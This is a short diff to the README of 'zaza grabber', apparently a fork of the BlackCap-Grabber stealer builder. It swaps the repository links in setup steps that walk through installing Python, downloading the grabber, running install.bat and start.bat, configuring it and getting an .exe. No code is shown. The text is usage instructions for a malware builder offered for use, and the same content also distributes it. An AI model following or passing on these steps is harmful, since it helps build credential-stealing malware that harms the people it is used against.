@@ -28,8 +28,8 @@ Script to add zaza grabber
 
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
 2. Install [ZazaGrab Files]([https://github.com/KSCHdsc/BlackCap-Grabber/archive/refs/heads/main.zip](https://github.com/xKrustyDemonx/zaza-grabber/archive/refs/heads/main.zip))
-3. Install all requirements [install.bat]([https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat](https://github.com/xKrustyDemonx/zaza-grabber/blob/main/install.bat))
-4. Click on start.bat [start.bat]([https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat](https://github.com/xKrustyDemonx/zaza-grabber/blob/main/start.bat))
+3. Install all requirements [install.bat](https://github.com/zazaman4000/zaza-grabber/blob/main/install.bat)
+4. Click on start.bat [start.bat](https://github.com/zazaman4000/zaza-grabber/blob/main/start.bat)
 5. Complete the configuration
 6. You have your .exe file enjoy :)
 
